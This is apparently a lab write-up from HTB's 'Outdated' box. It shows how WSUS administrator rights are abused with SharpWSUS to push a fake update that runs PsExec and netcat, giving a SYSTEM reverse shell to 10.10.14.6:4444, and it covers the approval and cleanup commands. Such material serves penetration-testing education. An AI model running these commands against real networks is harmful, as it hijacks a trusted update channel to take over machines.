## Quick introduction : What is WSUS ?
Windows Server Update Services (WSUS) is a tool that allows you to efficiently manage the distribution of updates from Microsoft Update to computers on your network. With WSUS, your server communicates directly with Microsoft's update server to fetch the latest updates (instead of each computers) and then deploys them across your network. As a WSUS administrator, you have the power to control when and how these updates are installed on your networked computers.

This feature is particularly useful for large companies where you need to avoid updates being installed simultaneously on all resources. It also gives you the flexibility to ensure that updates are only pushed out if they're compatible with your existing systems.

The following schema is explaining the basics :

However, even if you have some leverage as a WSUS administrator , it doesn't grant you the ability to force install updates on individuals computers. Instead, WSUS allows administrators to approve updates for installation on client machines. However, the actual installation process is ultimately controlled by the individual computers' settings, which may include automatic or manual installation by the user, or to a predefined schedule. 

With that said, let's see what we can do as a WSUS administrator in the context of an attacker.

## Approving malicious updates

As an attacker, WSUS administrator rights can be used to create and approve a malicious update allowing us to execute a payload on clients using WSUS.

A great tool can help us in this matter : `SharpWSUS` which you can find [Here](https://github.com/nettitude/SharpWSUS)

[This blog](https://labs.nettitude.com/blog/introducing-sharpwsus/) shows perfectly what it can do and we are going to try a different payload.

### SharpWSUS

You can build this tool using `Visual Studio` and then run it on the target machine :

#### Locating the WSUS server : 

We can locate the WSUS server using the `locate` command : 

```powershell
.\SharpWSUS.exe locate
```

![img-description](/assets/Pasted image 20240211145220.png)


which is the same than querying the registry key `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate` :
```powershell
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
```

#### Inspecting the WSUS server : 

At this point, you have to had the WSUS administrator rights to access the `MICROSOFT##WID` database :

```powershell
.\SharpWSUS.exe inspect
```

With the rights, here what you get :

#### Creating and approving malicious update

Malicious patches do have some limitations : 
* once the update is created and approved, we have to wait for the client to install the update
* the payload **must** be a Microsoft signed binary
* the payload **must** point to a location on disk


We are going to use `psexec` as the microsoft signed binary. However, instead of creating a new user with local admin rights, we'll try a reverse shell.

Here's `SharpWSUS` convenient `create` command :
```powershell
Create an update (NOTE: The payload has to be a windows signed binary):
    SharpWSUS.exe create /payload:[File location] /args:[Args for payload] </title:[Update title] /date:[YYYY-MM-DD] /kb:[KB on update] /rating:[Rating of update] /msrc:[MSRC] /description:[description] /url:[url]>
```

You don't need all the parameters : payload, args are enough since the others are already hardcoded in `SharpWSUS` : 

```c#
        public static string CommandName => "create";
        public static int iRevisionID;
        public static string PayloadPath = "";
        public static string PayloadArgs = "";
        public static string UpdateTitle = "SharpWSUS Update";
        public static string UpdateDate = "2021-09-26";
        public static string UpdateRating = "Important";
        public static string UpdateMSRC = "";
        public static string UpdateKB = "5006103";
        public static string UpdateDescription = "Install this update to resolve issues in Windows.";
        public static string UpdateURL = @"https://www.nettitude.com";

```


```powershell
.\SharpWSUS.exe create /payload:"C:\Users\svc_sql\Documents\rlyeh\PsExec64.exe" /args:"-accepteula -s -d C:\Users\svc_sql\Documents\rlyeh\nc64.exe -e cmd.exe 10.10.14.6 4444" /title:"Antemess Update"
```

where :
* `-s` running the process as system
* `-d `run the process in the background
* `-accepteula` accept the End-User License Agreement without requiring manual intervention

![img-description](/assets/Pasted image 20240211165121.png)

Now that the update is created, approval is required for targeted machine to deploy the update. `SharpWSUS`'s approve command is the next step. Beforehand, make sure to fire up a listener.

```powershell
SharpWSUS.exe approve /updateid:fdf6645f-94f7-4301-8bc9-3050ba5ef9f7 /computername:Target.FQDN /groupname:"Group Name"
```

in our case : 

```powershell
.\SharpWSUS.exe approve /updateid:fdf6645f-94f7-4301-8bc9-3050ba5ef9f7 /computername:openAD.king.htb /groupname:"Antemess Update"
```
![img-description](/assets/Pasted image 20240211165518.png)

WSUS patches are approved per WSUS group and not per machine, this is why we need that the machine we are targeting is in a group with no other machines.

And as we can see if we use the `inspect` command : 

![img-description](/assets/Pasted image 20240211165801.png)

#### It's waiting time

Now, we wait for the update to be installed by the machine. Once it's done, we have a call back as system on our listener : 

![img-description](/assets/Pasted image 20240211165924.png)

#### It's cleaning time 

`SharpWSUS` has another convenient command : `delete` 

```powershell
.\SharpWSUS.exe delete /updateid:fdf6645f-94f7-4301-8bc9-3050ba5ef9f7 /computername:openAD.king.htb /groupname:"Antemess Update"
```

That's it ! Be sure to check the blog post from `SharpWSUS`'s creator. If you want to try this, you can do HTB's `outdated` box.
